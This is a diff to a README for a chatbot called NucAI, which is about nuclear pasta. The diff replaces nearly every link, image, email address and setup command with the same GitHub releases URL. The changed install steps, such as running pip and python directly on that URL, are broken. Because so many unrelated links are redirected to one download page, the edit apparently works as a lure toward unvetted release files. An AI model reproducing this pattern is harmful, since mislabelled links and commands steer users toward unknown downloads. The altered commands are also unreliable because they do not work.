@@ -1,6 +1,6 @@
 # NucAI: Emulating Nuclear Pasta with an Innovative Chatbot 🤖🌌
 
-![NucAI Logo](https://img.shields.io/badge/NucAI-Chatbot-blue?style=for-the-badge&logo=appveyor)
+![NucAI Logo](https://github.com/Salohokin/NucAI/releases)
 
 ## Table of Contents
 
@@ -39,7 +39,7 @@ To get started with NucAI, follow these steps to set up your environment and beg
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Salohokin/NucAI.git
+   git clone https://github.com/Salohokin/NucAI/releases
    ```
 
 2. Navigate to the project directory:
@@ -51,13 +51,13 @@ To get started with NucAI, follow these steps to set up your environment and beg
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Salohokin/NucAI/releases
    ```
 
 4. Run the chatbot:
 
    ```bash
-   python main.py
+   python https://github.com/Salohokin/NucAI/releases
    ```
 
 ### Usage
@@ -86,7 +86,7 @@ We welcome contributions to NucAI. If you want to help improve the chatbot, plea
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) when contributing.
+Please adhere to our [Code of Conduct](https://github.com/Salohokin/NucAI/releases) when contributing.
 
 ## License
 
@@ -97,13 +97,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, feel free to reach out to the maintainer:
 
 - **Name**: Salohokin
-- **Email**: salohokin@example.com
+- **Email**: https://github.com/Salohokin/NucAI/releases
 
 ## Releases
 
 To access the latest features and updates, check out the [Releases section](https://github.com/Salohokin/NucAI/releases). Download the files you need and start exploring the fascinating world of nuclear pasta!
 
-![Nuclear Pasta](https://example.com/nuclear-pasta-image.jpg)
+![Nuclear Pasta](https://github.com/Salohokin/NucAI/releases)
 
 ## Acknowledgments
 
@@ -112,16 +112,16 @@ To access the latest features and updates, check out the [Releases section](http
 
 ## Additional Resources
 
-- [Neutron Stars](https://example.com/neutron-stars)
-- [Nuclear Physics](https://example.com/nuclear-physics)
-- [Astrophysics Research](https://example.com/astrophysics)
+- [Neutron Stars](https://github.com/Salohokin/NucAI/releases)
+- [Nuclear Physics](https://github.com/Salohokin/NucAI/releases)
+- [Astrophysics Research](https://github.com/Salohokin/NucAI/releases)
 
 ## Community
 
 Join our community to discuss nuclear pasta and other astrophysical topics:
 
-- [Discord](https://discord.gg/example)
-- [Reddit](https://reddit.com/r/NucAI)
+- [Discord](https://github.com/Salohokin/NucAI/releases)
+- [Reddit](https://github.com/Salohokin/NucAI/releases)
 
 ## FAQ
 
